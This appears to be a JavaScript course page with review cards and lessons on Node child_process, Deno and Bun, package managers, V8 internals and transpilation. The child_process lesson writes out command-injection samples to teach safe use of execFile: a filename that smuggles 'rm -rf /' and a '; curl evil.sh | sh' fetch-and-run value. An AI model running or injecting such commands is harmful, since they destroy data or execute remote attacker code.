R1 — Regular Expressions Advanced Data & Collections · 7 days since review
Quick reminder: named groups (?<name>...), lookbehind (?<=...) and lookahead (?=...), matchAll() for iterating all matches, the d flag for match indices, and Unicode mode with the u/v flags.
Key Pattern — matchAll with named groups
JavaScript
// Iterate every match, pulling out named capture groups
const log = '2026-06-18 ERROR boom | 2026-06-19 WARN slow';
const re = /(?<date>\d{4}-\d{2}-\d{2}) (?<level>[A-Z]+) (?<msg>\w+)/g;

// matchAll returns an ITERATOR, not an array — spread it
for (const m of log.matchAll(re)) {
  const { date, level, msg } = m.groups;
  console.log(`${date} [${level}] ${msg}`);
}
2026-06-18 [ERROR] boom 2026-06-19 [WARN] slow

R2 — Design Patterns: Observer, Strategy, Command Modules & Patterns · 6 days since review
Quick reminder: Observer decouples event producers from consumers. Strategy swaps algorithms at runtime via function references. Command encapsulates actions as objects for undo/redo.
Key Pattern — EventEmitter (Observer)
JavaScript
// Minimal Observer: producers emit, consumers subscribe
class EventEmitter {
  #listeners = new Map();

  on(event, fn) {
    if (!this.#listeners.has(event)) this.#listeners.set(event, new Set());
    this.#listeners.get(event).add(fn);
    return () => this.#listeners.get(event).delete(fn); // unsubscribe
  }

  emit(event, ...args) {
    this.#listeners.get(event)?.forEach(fn => fn(...args));
  }
}

const bus = new EventEmitter();
const off = bus.on('login', user => console.log('Welcome', user));
bus.emit('login', 'Alice');
off();                       // remove the listener
bus.emit('login', 'Bob');    // nothing logs now
Welcome Alice
Challenge

Implement a calculator that supports undo. Each operation (add, multiply, etc.) is a Command object with execute() and undo() methods. Keep a history stack; calc.undo() reverses the last command. Verify that undoing twice rolls back two operations.

#1 Pitfall: Memory leaks from never removing Observer subscriptions — always have on() return an unsubscribe function and call it when the consumer is done.
R3 — Functional Patterns: Compose, Pipe, Curry Modules & Patterns · 6 days since review
Quick reminder: compose(f, g)(x) = f(g(x)) (right-to-left). pipe(f, g)(x) = g(f(x)) (left-to-right). curry(fn) turns fn(a, b) into fn(a)(b) for partial application.
Key Pattern — pipe via reduce
JavaScript
// pipe: apply functions left-to-right
const pipe = (...fns) => (x) => fns.reduce((acc, fn) => fn(acc), x);

const double = n => n * 2;
const inc    = n => n + 1;
const square = n => n * n;

const transform = pipe(double, inc, square);
console.log(transform(3));   // ((3*2)+1)^2 = 7^2 = 49

// compose is the mirror image (right-to-left)
const compose = (...fns) => (x) => fns.reduceRight((acc, fn) => fn(acc), x);
console.log(compose(square, inc, double)(3)); // same: 49
49 49
Challenge

#1 Pitfall: Forgetting that compose reads right-to-left (the opposite of how you read the code) — prefer pipe for readability unless you have a mathematical reason to compose.
R4 — Pub/Sub & EventTarget Modules & Patterns · 6 days since review
Quick reminder: EventTarget is the native event system. CustomEvent carries arbitrary data via .detail. Event delegation attaches one listener to a parent instead of many to children. addEventListener options: once, passive, capture.
Key Pattern — CustomEvent dispatch/listen
JavaScript
// EventTarget can be subclassed to make any object an event hub
class Store extends EventTarget {
  #state = {};
  set(key, value) {
    this.#state[key] = value;
    // CustomEvent carries data via the `detail` field
    this.dispatchEvent(new CustomEvent('change', { detail: { key, value } }));
  }
}

const store = new Store();
store.addEventListener('change', (e) => {
  console.log(`changed ${e.detail.key} -> ${e.detail.value}`);
}, { once: true });           // fires only the first time

store.set('theme', 'dark');   // logs
store.set('lang', 'en');      // silent — listener already removed
changed theme -> dark

Key Pattern — DocumentFragment batch insert
JavaScript (browser)
// Build the whole subtree off-DOM, then insert ONCE
const items = ['apple', 'banana', 'cherry'];
const frag = document.createDocumentFragment();

for (const text of items) {
  const li = document.createElement('li');
  li.textContent = text;
  frag.append(li);            // appends to the fragment — no reflow
}

const ul = document.querySelector('#list');
ul.append(frag);              // single DOM mutation, single reflow

console.log(ul.children.length);  // 3

R6 — Memory Management & Garbage Collection Performance & Security · 3 days since review
Quick reminder: JS uses mark-and-sweep GC. Leaks come from: detached DOM nodes (references kept after removal), closures capturing large scopes, forgotten event listeners, and global variables. WeakMap/WeakRef allow GC of keys/targets.
Key Pattern — detached DOM leak and fix
JavaScript (browser)
// LEAK: cache holds a reference to a node after it's removed from the DOM
const cache = [];
function badAttach() {
  const node = document.createElement('div');
  document.body.append(node);
  cache.push(node);            // node stays reachable via `cache`
  node.remove();               // removed from DOM, but NOT from memory
}

// FIX: don't retain detached nodes; use a WeakRef if you must reference one
const weakCache = [];
function goodAttach() {
  const node = document.createElement('div');
  document.body.append(node);
  weakCache.push(new WeakRef(node)); // GC can reclaim once node is detached
  node.remove();
}

console.log(weakCache[0].deref()); // node (until GC runs), then undefined
<div></div>
Challenge

#1 Pitfall: Closures in long-lived callbacks (e.g., setInterval) silently retain the entire enclosing scope — even variables you never use inside the callback. Null out large captures or clear the interval.
1 Node.js Runtime
1. Node.js child_process — exec, spawn & fork new
Running external commands, parallel processing with child processes, and IPC between Node processes are essential for build tools, CLIs, and server-side orchestration. Choosing the wrong API leads to out-of-memory crashes (buffering huge output) or command-injection vulnerabilities.

Node's node:child_process module offers several ways to run other programs. They differ in how they handle output and whether they spin up a shell:

  1. exec — runs a command through a shell, buffers all output, and hands it to a callback. Great for simple commands with small output.
  2. execSync — synchronous version that returns the output directly. Handy in build scripts where blocking is acceptable.
  3. spawn — streams stdout/stderr instead of buffering. Returns a ChildProcess whose .stdout/.stderr are readable streams. Use for large or long-running output.
  4. fork — a specialized spawn for running another Node.js script. It sets up an IPC channel automatically; parent and child talk via .send() and the 'message' event.
  5. execFile — like exec but does not spawn a shell (safer and faster). Arguments are passed as an array, so there is no shell to inject into.

The buffering vs. streaming distinction is the key mental model: exec waits for the process to finish and collects everything; spawn gives you data as it arrives.

Example 1a: exec — buffer small output

node exec-basic.js
import { exec } from 'node:child_process';

// exec runs through a shell and buffers ALL output into stdout
exec('echo "line one" && echo "line two"', (err, stdout, stderr) => {
  if (err) {
    console.error('failed:', err.message);
    return;
  }
  // Split buffered output into an array of trimmed lines
  const lines = stdout.trim().split('\n');
  console.log(lines);
});
[ 'line one', 'line two' ]

Example 1b: spawn — stream large output

node spawn-stream.js
import { spawn } from 'node:child_process';

// spawn takes the command and an ARRAY of args (no shell parsing)
const child = spawn('find', ['.', '-type', 'f']);

let count = 0;
let buffer = '';

// stdout is a readable stream — data arrives in chunks
child.stdout.on('data', (chunk) => {
  buffer += chunk;
  const lines = buffer.split('\n');
  buffer = lines.pop();        // keep the partial last line
  count += lines.filter(Boolean).length;
});

child.stderr.on('data', (d) => console.error('stderr:', d.toString()));

child.on('close', (code) => {
  console.log(`exit code ${code}, counted ${count} files`);
});
exit code 0, counted 1842 files

Example 1c: fork — IPC between Node processes

node parent.js
// --- parent.js ---
import { fork } from 'node:child_process';

const child = fork('./worker.js');   // auto IPC channel

child.on('message', (msg) => {
  console.log('parent received:', msg);   // { input: 5, square: 25 }
  child.disconnect();                     // close the IPC channel
});

child.send({ input: 5 });            // send a structured-cloneable message

// --- worker.js ---
process.on('message', (msg) => {
  process.send({ input: msg.input, square: msg.input ** 2 });
});
parent received: { input: 5, square: 25 }

Example 1d: handling exit codes & signals

node exit-handling.js
import { spawn } from 'node:child_process';

const child = spawn('sleep', ['10']);

// ALWAYS listen for 'error' — fires if the binary can't be spawned at all
child.on('error', (err) => console.error('spawn error:', err.message));

// 'exit' gives both the exit code and the terminating signal
child.on('exit', (code, signal) => {
  if (signal) console.log(`killed by signal ${signal}`);
  else        console.log(`exited with code ${code}`);
});

// Kill it after 1 second with SIGTERM
setTimeout(() => child.kill('SIGTERM'), 1000);
killed by signal SIGTERM

Example 1e: execFile — no shell, no injection

node execfile-safe.js
import { execFile } from 'node:child_process';

const userInput = 'file.txt; rm -rf /';   // malicious!

// execFile passes args as data, NOT through a shell — the ';' is literal
execFile('ls', ['-la', userInput], (err, stdout) => {
  // ls just reports it can't find a file literally named "file.txt; rm -rf /"
  console.log(err ? 'no such file (and nothing got deleted!)' : stdout);
});

// exec('ls -la ' + userInput) would have RUN `rm -rf /` via the shell.
no such file (and nothing got deleted!)
Common Mistakes
WRONG: exec('convert ' + userFilename + ' out.png') — concatenating user input into an exec string runs through a shell, enabling command injection (userFilename = '; curl evil.sh | sh').
RIGHT: Use execFile('convert', [userFilename, 'out.png']) or spawn with an args array. Arguments are passed as data, so shell metacharacters are inert.
WRONG: Using exec for a command that produces megabytes of output. It buffers everything in memory and throws maxBuffer exceeded (or OOMs).
RIGHT: Use spawn and consume child.stdout as a stream so memory stays flat regardless of output size.
Key Rules
  • 2026-07-09 (current — Day 28)
  • Use exec for simple commands with small output you want as one string.
  • Use spawn for streaming or large/long-running output.
  • Use fork when you need IPC between Node processes (offloading CPU work, worker pools).
  • Never pass unsanitized user input to exec; prefer execFile/spawn with an args array.
  • Always attach an 'error' handler to spawn/fork — a missing binary throws there, not in the callback.

2 Use spawn to stream the output of find . -name "*.js" line by line and resolve with the total count of matching files. Handle the partial-line buffering correctly so a filename split across two chunks is counted once.

2. Deno & Bun — Alternative JavaScript Runtimes new
Modern JS runtimes fix Node.js pain points — no package.json required, built-in TypeScript, native Web API compatibility, and security sandboxing. Knowing when to reach for each runtime is increasingly important as tooling fragments.

Deno was created by Ryan Dahl (Node's original author) to fix Node's early mistakes:

  • Secure by default — no file, network, or env access unless you grant it with flags like --allow-read, --allow-net.
  • Built-in TypeScript — run .ts files directly, no build step.
  • Web-standard APIs — fetch, Request, Response, ReadableStream are all global, matching the browser.

Bun optimizes for speed:

  • Built on JavaScriptCore (Safari's engine) instead of V8.
  • Ships a bundler, transpiler, and test runner in one binary.
  • Strong Node.js compatibility — it reads node_modules and most npm packages work.

The big idea: code written against Web APIs (rather than Node-specific modules) tends to run unchanged on Node 18+, Deno, and Bun. Node-specific modules like fs and path do not automatically work everywhere.

Example 2a: the same fetch code runs on all three

portable.js (Node 18+ / Deno / Bun)
// fetch, Response, and JSON parsing are Web standards present in all three
const res = await fetch('https://api.example.com/users/1');

if (!res.ok) throw new Error(`HTTP ${res.status}`);

const user = await res.json();
console.log(user.name);

// No imports needed — these are global in every modern runtime.
Alice

Example 2b: Deno's permission model

shell
# Without permission, network access is DENIED at runtime:
$ deno run server.ts
error: Requires net access to "0.0.0.0:8000",
run again with the --allow-net flag

# Grant exactly what's needed:
$ deno run --allow-net server.ts
Listening on http://0.0.0.0:8000

# Scope it tightly to one host:
$ deno run --allow-net=api.example.com fetch.ts
Listening on http://0.0.0.0:8000

Example 2c: Deno HTTP server (Web APIs)

deno run --allow-net server.ts
// Deno.serve uses the standard Request/Response objects
Deno.serve({ port: 8000 }, (req: Request): Response => {
  const url = new URL(req.url);
  if (url.pathname === '/') {
    return new Response('hello from Deno', {
      headers: { 'content-type': 'text/plain' },
    });
  }
  return new Response('not found', { status: 404 });
});
$ curl localhost:8000/ hello from Deno

Example 2d: Bun's HTTP server

bun run server.js
// Bun.serve also speaks Request/Response — note the `fetch` handler name
Bun.serve({
  port: 3000,
  fetch(req) {
    const { pathname } = new URL(req.url);
    return new Response(`you asked for ${pathname}`);
  },
});

console.log('Bun listening on http://localhost:3000');
Bun listening on http://localhost:3000

Example 2e: detect which runtime is executing

runtime-detect.js
function whichRuntime() {
  if (typeof globalThis.Deno !== 'undefined') return 'Deno';
  if (typeof globalThis.Bun  !== 'undefined') return 'Bun';
  if (typeof globalThis.process?.versions?.node === 'string') return 'Node.js';
  return 'unknown';
}

console.log('Running on:', whichRuntime());
Running on: Node.js
Common Mistakes
WRONG: Assuming Node APIs work everywhere — writing import fs from 'fs' in code meant to run on Deno, where the equivalent is Deno.readFile (or the node:fs compat namespace).
RIGHT: Prefer Web-standard APIs (fetch, ReadableStream, URL) for portable code; reach for runtime-specific APIs only when you've committed to that runtime.
WRONG: Running Deno with broad permissions like --allow-all — this defeats the entire point of its security sandbox.
RIGHT: Grant the narrowest permission that works, e.g. --allow-net=api.example.com --allow-read=./data.
Key Rules
  • Use Deno for security-conscious scripts and tooling where the permission model adds value.
  • Use Bun for speed-critical builds, tests, and tooling.
  • Use Node.js for ecosystem maturity and production stability.
  • Write against Web APIs to keep code portable across all three.

3. Package Management — npm, pnpm & yarn new
Every JS project depends on packages. Understanding package.json, lockfiles, the exports field, peer dependencies, and workspace monorepos is essential for reproducible, maintainable projects — and for publishing libraries others can consume.

The package.json is the manifest for a JS project. Key fields:

  • name, version — identity (semver).
  • type — "module" (ESM) or "commonjs" (CJS).
  • main/module/exports — entry points; exports is the modern, authoritative one and can gate access to internal files.
  • dependencies vs devDependencies vs peerDependencies — runtime deps, build/test-only deps, and deps the consumer must provide (plugins/frameworks).

Lockfiles (package-lock.json, pnpm-lock.yaml, yarn.lock) pin the exact resolved versions of the whole tree so every install is reproducible. The three package managers differ mainly in storage strategy: pnpm uses a global content-addressable store (symlinked into node_modules, saving disk space); yarn PnP can eliminate node_modules entirely; npm is the default that ships with Node.

Version ranges in dependencies control what npm install may pick: ^1.2.3 allows any 1.x ≥ 1.2.3 (minor + patch), ~1.2.3 allows only 1.2.x ≥ 1.2.3 (patch only).

Example 3a: dual ESM/CJS via the exports field

package.json
{
  "name": "my-lib",
  "version": "1.0.0",
  "type": "module",
  "exports": {
    ".": {
      "import": "./dist/index.mjs",   // when consumer uses import
      "require": "./dist/index.cjs",  // when consumer uses require
      "types": "./dist/index.d.ts"    // TypeScript declarations
    },
    "./utils": "./dist/utils.mjs"     // subpath export: my-lib/utils
  }
}
// Consumers can ONLY import "my-lib" and "my-lib/utils". // Anything not listed in "exports" is hidden (encapsulation).

Example 3b: peerDependencies for a plugin

package.json (an eslint plugin)
{
  "name": "eslint-plugin-cool",
  "version": "2.0.0",
  "peerDependencies": {
    "eslint": "^8.0.0 || ^9.0.0"   // consumer provides eslint
  },
  "devDependencies": {
    "eslint": "^9.0.0"             // we use it for our own tests
  }
}
// The plugin does NOT bundle its own eslint — it uses the one the // consuming project already installed, avoiding duplicate/mismatched copies.

Example 3e: what version ranges actually match

semver ranges
// Given published versions: 4.0.0, 4.1.0, 4.1.5, 4.2.0, 5.0.0

"^4.0.0"  // matches 4.0.0 .. 4.2.0  (any 4.x, NOT 5.0.0)
"~4.1.0"  // matches 4.1.0 .. 4.1.5  (only 4.1.x patches)
">=4.1.0" // matches 4.1.0 .. 5.0.0  (everything at or above)
"4.x"     // matches 4.0.0 .. 4.2.0
"*"       // matches ANY version (dangerous — avoid)
^4.0.0 -> highest is 4.2.0 ~4.1.0 -> highest is 4.1.5
Common Mistakes
WRONG: Adding node_modules and the lockfile to .gitignore "to keep the repo clean." Omitting the lockfile makes builds non-reproducible — CI may resolve different versions than your machine.
RIGHT: Ignore node_modules but commit the lockfile (package-lock.json / pnpm-lock.yaml / yarn.lock).
WRONG: Putting a runtime dependency in devDependencies. It works locally (everything is installed) but breaks in production where dev deps are pruned.
RIGHT: Anything imported by shipped code goes in dependencies; build/test-only tools go in devDependencies.
Key Rules
  • Always commit the lockfile for reproducible installs.
  • Use peerDependencies for plugins/extensions so the host provides the shared dep.
  • Use the exports field in libraries to define entry points and hide internals.
  • Pick one package manager per project and enforce it (e.g. via packageManager field / CI check).
  • Know the difference: ^ = minor range, ~ = patch range.

2 Engine Internals & Tooling
4. V8 Internals — Hidden Classes, Inline Caching & JIT new
Understanding how V8 optimizes (and de-optimizes) JavaScript helps you write code that runs faster without changing the algorithm — by avoiding hidden-class churn, megamorphic call sites, and deoptimization triggers.

V8 (the engine in Node.js and Chrome) makes dynamically-typed JS fast by making bets about your code's shapes and types, then specializing machine code around those bets.

  1. Hidden classes (aka Shapes/Maps) — V8 assigns each object an internal "shape" describing its properties and their memory offsets. Objects created the same way share a hidden class, enabling fast offset-based property access. Adding properties in a different order creates different hidden classes.
  2. Inline caching (IC) — V8 caches where a property was found at each call site. Monomorphic (one shape seen) = fastest. Polymorphic (2–4 shapes) = slower. Megamorphic (5+ shapes) = falls back to a generic dictionary lookup.
  3. JIT compilation — code starts in the interpreter (Ignition); "hot" functions get compiled to optimized machine code by TurboFan, guided by runtime type feedback.
  4. Deoptimization triggers — changing an object's shape after creation, mixing types in arrays ([1, "two", 3.0]), leaking the arguments object, delete on objects (transitions to slow dictionary mode), and eval/with (prevent optimization entirely).

The practical takeaway: write predictable, consistent code — initialize all properties in the constructor in the same order, and keep arrays homogeneously typed.

Example 4a: same vs different property order

node hidden-class.js
// FAST: both objects get the SAME hidden class (props added in same order)
function makeFast(x, y) {
  const o = {};
  o.x = x;
  o.y = y;
  return o;
}
const a = makeFast(1, 2);
const b = makeFast(3, 4);   // shares hidden class with `a`

// SLOW: property order differs -> two DIFFERENT hidden classes
const c = {}; c.x = 1; c.y = 2;
const d = {}; d.y = 2; d.x = 1;   // different shape than `c`!

console.log('a and b share a shape; c and d do not');
a and b share a shape; c and d do not

Example 4b: monomorphic vs megamorphic call sites

node ic.js
// This function reads `obj.value`. The IC at `obj.value` specializes
// to whatever shapes flow through it.
function readValue(obj) {
  return obj.value;
}

// MONOMORPHIC: every object has the same shape -> fastest path
const sameShape = [{ value: 1 }, { value: 2 }, { value: 3 }];
sameShape.forEach(readValue);

// MEGAMORPHIC: 5+ different shapes -> V8 gives up specializing
readValue({ value: 1 });
readValue({ a: 1, value: 2 });
readValue({ b: 1, value: 3 });
readValue({ c: 1, value: 4 });
readValue({ d: 1, value: 5 });   // 5th distinct shape -> megamorphic

console.log('readValue is now megamorphic — slower lookups');
readValue is now megamorphic — slower lookups

// PACKED_SMI_ELEMENTS — dense array of small integers (fastest)
const packed = [1, 2, 3];

// HOLEY_SMI_ELEMENTS — a "hole" makes it holey (slower; checks for gaps)

Example 4d: the cost of delete

node delete-cost.js
// `delete` transitions an object to slow "dictionary mode" and
// invalidates the hidden class — future property access is slower.
const user = { id: 1, name: 'Alice', token: 'secret' };

// SLOW: delete changes the shape
delete user.token;

// FAST alternative: set to undefined (shape is preserved)

Common Mistakes
WRONG: Micro-optimizing blindly — rewriting clear code into cryptic forms chasing imagined V8 wins, without ever profiling.
RIGHT: Profile first (--prof, DevTools). Only then apply targeted fixes; most hot paths are bounded by algorithm, not micro-shape effects.
WRONG: delete obj.key on hot-path objects, forcing dictionary mode and deoptimizing every access to that object.
RIGHT: Set obj.key = undefined, or design the object so the key was never there; preserve a stable shape.
WRONG: Conditionally adding properties in a constructor, creating a branching set of hidden classes for "the same" type.
RIGHT: Initialize all properties (even to null) in the constructor, in a fixed order, so every instance shares one shape.
Key Rules
  • Initialize all object properties in the constructor, in a consistent order, so instances share a hidden class.
  • Keep arrays homogeneously typed; avoid holes and pushing undefined into SMI arrays.
  • Avoid delete on hot objects — prefer = undefined or a stable shape.
  • Profile before optimizing; readable code that V8 can predict usually wins anyway.

5. Polyfills & Transpilation — Babel, core-js & Feature Detection new
Supporting older browsers and runtimes requires transpiling modern syntax and polyfilling missing APIs. Understanding the toolchain (Babel, SWC, core-js, browserslist) lets you ship smaller bundles and avoid redundant transforms.

Two distinct problems, two distinct tools:

  • Transpilation rewrites syntax the target can't parse — e.g. optional chaining a?.b becomes equivalent if/ternary code. Tools: Babel, SWC, TypeScript.
  • Polyfilling adds missing runtime APIs — e.g. defining Array.prototype.at or structuredClone when the environment lacks them. Tool: core-js.

Babel orchestrates this: @babel/preset-env reads your browserslist targets and applies exactly the transforms (and, with useBuiltIns: 'usage', exactly the core-js polyfills) those targets require — nothing more. SWC is a Rust-based drop-in alternative that's 20–70× faster and powers Next.js and parts of Vite.

Feature detection ('at' in Array.prototype) is safer than sniffing the user-agent string, because it tests the actual capability rather than guessing from a (spoofable) version string.

Example 5a: optional chaining, before & after

source vs transpiled output
// SOURCE (modern syntax)
const city = user?.address?.city;

// TRANSPILED for older targets (conceptual output)
var _user, _user$address;
const city =
  (_user = user) === null || _user === void 0
    ? void 0
    : (_user$address = _user.address) === null || _user$address === void 0
      ? void 0
      : _user$address.city;
// Same behavior, but parseable by engines without ?. support.

Example 5d: feature detection over UA sniffing

JavaScript
// Test the capability directly — not navigator.userAgent
const hasAt = 'at' in Array.prototype;
const hasClone = typeof globalThis.structuredClone === 'function';
const hasAny = typeof Promise.any === 'function';

// Progressive enhancement: use the feature if present, else a fallback
function lastItem(arr) {
  return hasAt ? arr.at(-1) : arr[arr.length - 1];
}

Common Mistakes
WRONG: import "core-js" (the whole library) to be "safe." This adds tens of KB of polyfills you don't use, bloating the bundle.
RIGHT: Use useBuiltIns: 'usage' with a corejs version, or import individual feature modules; ship only what your code and targets require.
WRONG: Transpiling all of node_modules, slowing builds and sometimes breaking already-compiled packages.
RIGHT: Exclude node_modules from transpilation by default; selectively include only packages known to ship modern, untranspiled source.
WRONG: Not setting browserslist targets — Babel then assumes very old browsers and over-transpiles everything.
RIGHT: Define explicit browserslist targets so modern engines receive smaller, faster output.
Key Rules
  • Use @babel/preset-env with useBuiltIns: 'usage' for automatic, minimal polyfilling.
  • Set explicit browserslist targets so you don't over-transpile for modern engines.
  • Prefer feature detection ('x' in Y, typeof fn === 'function') over UA sniffing.
  • Reach for SWC when build speed matters; it mirrors preset-env behavior.
